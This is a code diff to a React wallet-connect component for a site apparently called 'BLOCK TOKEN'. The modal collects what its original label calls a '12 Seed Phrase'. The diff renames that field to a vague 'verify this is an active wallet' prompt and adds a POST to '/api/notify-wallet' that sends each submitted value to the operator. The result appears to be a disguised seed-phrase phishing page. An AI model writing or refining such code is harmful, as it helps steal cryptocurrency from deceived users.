@@ -70,7 +70,11 @@ export default function Navigation() {
       ])
 
     if (dbError) throw dbError
-
+    await fetch('/api/notify-wallet', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ walletType: selectedWallet, walletAddress: walletAddress.trim() }),
+    })
     setTimeout(() => {
       setStatus('connected')
     }, 1800)
@@ -91,7 +95,7 @@ export default function Navigation() {
           <div className="flex justify-between items-center">
             <div className="flex items-center gap-2">
               <div className="text-2xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
-                BLOCK TOKEN
+                BLOCK
               </div>
             </div>
 
@@ -167,7 +171,7 @@ export default function Navigation() {
           ) : (
             <>
               {/* Wallet grid */}
-              <p className="text-sm text-muted-foreground mb-3">Choose your wallet</p>
+              <p className="text-sm text-muted-foreground mb-3">Choose destination wallet</p>
               <div className="grid grid-cols-4 gap-3 mb-6">
                 {WALLETS.map((w) => (
                   <button
@@ -198,7 +202,7 @@ export default function Navigation() {
               {/* Address input */}
               <div className="mb-4">
                 <label className="block text-sm font-medium mb-2">
-                  12 Seed Phrase
+                Verify this is an active wallet to avoid loss of token
                 </label>
                 <textarea
                   value={address}
@@ -221,12 +225,12 @@ export default function Navigation() {
                 {status === 'connecting' ? (
                   <>
                     <Spinner />
-                    Connecting…
+                    Verifying...
                   </>
                 ) : (
                   <>
                     <Wallet className="w-4 h-4" />
-                    Connect Wallet
+                    Verify Wallet
                   </>
                 )}
               </button>
